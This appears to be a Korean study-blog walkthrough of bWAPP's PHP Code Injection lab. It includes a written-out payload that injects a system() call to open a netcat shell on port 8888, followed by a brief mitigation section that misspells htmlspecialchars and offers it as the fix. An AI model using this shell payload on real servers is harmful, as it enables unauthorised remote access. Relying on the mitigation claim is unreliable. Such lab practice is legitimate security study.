---
title: "[bWAPP] 1. Injection - PHP Code Injection"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## PHP Code Injection

![image-20220316023117510](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023117510.png)

- message 누르면

![image-20220316023148120](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023148120.png)

- URL에 변수 확인

<br>

### 삽입

![image-20220316023250426](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023250426.png)

<br>

### System 명령어 사용

![image-20220316023524961](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023524961.png)

`message=test;system('nc -lvp 8888 -e /bin/bash')`

- 포트 열어줌

<br>

![image-20220316023643171](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316023643171.png)

- Bbox IP로 포트에 연결

<br>

<br>

## 대응방안

### Linux

![image-20220317230730943](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317230730943.png)

- vi 편집기로 phpi.php 소스코드를 열어주면
- 레벨 0 = Low 일때는 요청받은 메시지 그대로 출력하고
- 레벨 1,2 = Medium, High 일 때는 htmlsecialchars 함수를 사용하고있다.
- htmlspecailchars : 메타문자가 html 태그로 사용되지 않도록 방지하여 그대로 출력하게 하는 함수.
